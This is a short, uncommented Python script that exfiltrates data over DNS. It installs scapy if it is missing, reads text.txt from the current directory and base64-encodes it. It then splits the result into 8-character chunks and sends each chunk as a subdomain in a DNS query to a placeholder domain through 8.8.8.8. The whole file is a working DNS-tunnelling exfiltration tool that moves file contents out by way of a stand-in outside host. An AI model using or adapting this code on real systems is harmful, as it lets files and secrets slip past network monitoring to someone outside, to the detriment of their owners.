import os, base64
try:
    from scapy.all import DNS, DNSQR, IP, sr1, UDP
except:
    import pip
    pip.main(['install', "scapy"])
finally:
    from scapy.all import DNS, DNSQR, IP, sr1, UDP

def dns_request(sub_domain):
    dns_req = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f'{sub_domain}.DOMAIN'))
    answer = sr1(dns_req, verbose=0)
    return answer

dir = os.getcwd()

f = open(f"{dir}/text.txt", "r")
text = f.read()
text_bytes = base64.b64encode(text.encode("ascii"))
list = [text_bytes[i:i+8] for i in range(0, len(text_bytes), 8)]
for item in list:
    item = item.decode('utf-8')
    if "=" in item:
        item = item.replace("=", "")
    print(dns_request(item))
